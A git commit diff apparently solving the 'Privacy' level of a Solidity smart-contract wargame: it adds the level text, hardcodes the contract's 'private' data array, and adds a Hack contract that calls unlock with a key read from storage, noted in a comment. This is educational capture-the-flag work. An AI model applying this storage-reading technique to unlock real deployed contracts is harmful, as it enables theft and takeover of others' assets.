725d9dd75f9311ec590e35a4ad552b8be1740beb
Abhishek  Taneja <abhishek.taneja@soundcloud.com>
2022-08-12 22:56:01 +0200

    Privacy level hack

--- hacks/12-Privacy.sol
+++ hacks/12-Privacy.sol
@@ -1,6 +1,17 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.16;
 
+/**
+The creator of this contract was careful enough to protect the sensitive areas of its storage.
+
+Unlock this contract to beat the level.
+
+Things that might help:
+
+Understanding how storage works
+Understanding how parameter parsing works
+Understanding how casting works
+**/
 contract Privacy {
 
   bool public locked = true;
@@ -10,8 +21,10 @@ contract Privacy {
   uint16 private awkwardness = uint16(block.timestamp);
   bytes32[3] private data;
 
-  constructor(bytes32[3] memory _data) {
-    data = _data;
+  constructor() {
+    data[0] = 0xfaaf9cb0c165b0d858c1247b2462e48b74387239c7e4189a7ff1b46a53a9c10d;
+    data[1] = 0x995bbc27e3ad38c9cf5485b1952040cba9a55e649863025f5174153addd0632e;
+    data[2] = 0xfb38d4cf6308fa33c8b0a8a09ea6f0a35719a6bc07e87f260aa25349bb5558f7;
   }
   
   function unlock(bytes16 _key) public {
@@ -28,4 +41,27 @@ contract Privacy {
       `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
       ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
   */
+}
+
+interface PrivacyI {
+  function unlock(bytes16 _key) external;
+}
+
+contract Hack {
+
+  PrivacyI privacy;
+
+  constructor(address _add){
+    privacy = PrivacyI(_add);
+  }
+
+  /**
+    function unlock(bytes16 _key) public 
+    Read the value from the storage or original contract
+    fb38d4cf6308fa33c8b0a8a09ea6f0a3 
+  **/
+  function hack(bytes16 _key) public {
+    privacy.unlock(_key);
+  }
+
 }
